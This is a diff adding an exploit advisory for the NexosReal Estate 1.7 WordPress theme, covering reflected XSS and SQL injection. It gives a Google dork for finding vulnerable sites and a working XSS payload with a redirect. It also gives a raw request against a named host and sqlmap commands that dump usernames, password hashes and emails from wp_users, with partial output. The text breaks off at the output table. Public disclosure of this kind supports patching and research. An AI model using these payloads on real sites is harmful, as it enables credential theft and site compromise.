@@ -1,0 +1,53 @@
+# Exploit Title: WordPress Theme NexosReal Estate 1.7 - 'search_order' SQL Injection
+# Google Dork: inurl:/wp-content/themes/nexos/
+# Date: 2020-06-17
+# Exploit Author: Vlad Vector
+# Vendor: Sanljiljan [ https://themeforest.net/user/sanljiljan ]
+# Software Version: 1.7
+# Software Link: https://themeforest.net/item/nexos-real-estate-agency-directory/21126242
+# Tested on: Debian 10
+# CVE: CVE-2020-15363, CVE-2020-15364
+# CWE: CWE-79, CWE-89
+
+
+
+### [ Info: ]
+
+[i] The Nexos theme through 1.7 for WordPress allows side-map/?search_order= SQL Injection.
+
+
+
+### [ Vulnerabilities: ]
+
+[x] Unauthenticated Reflected XSS
+[x] SQL Injection
+
+
+
+### [ PoC Unauthenticated Reflected XSS: ]
+
+[!] TARGET/TARGET-DIR/top-map/?search_order=idlisting DESC&search_location="><img src=x onerror=alert(`VLΛDVΞCTOR`);window.location=`https://twitter.com/vlad_vector`%3E>
+
+[!] GET /TARGET-DIR/top-map/?search_order=idlisting%20DESC&search_location=%22%3E%3Cimg%20src=x%20onerror=alert(`VL%CE%9BDV%CE%9ECTOR`);window.location=`https://twitter.com/vlad_vector`%3E%3E HTTP/1.1
+Host: listing-themes.com
+
+
+
+### [ PoC SQL Injection: ]
+
+[!] sqlmap --url="TARGET/TARGET-DIR/side-map/?search_order=idlisting%20DESC" -dbs --random-agent --threads 4
+
+[02:23:33] [INFO] the back-end DBMS is MySQL
+[02:23:33] [INFO] fetching database names
+[02:23:33] [INFO] fetching number of databases
+[02:23:33] [INFO] resumed: 2
+available databases [2]:
+[*] geniuscr_nexos
+[*] information_schema
+
+[!] sqlmap --url="TARGET/TARGET-DIR/side-map/?search_order=idlisting%20DESC" -D geniuscr_nexos -T wp_users -C user_login,user_pass,user_email --random-agent --threads 8
+
+Database: TARGET-DB
+Table: wp_users
+[9 entries]
++--------------+------------------------------------+-------------------------+
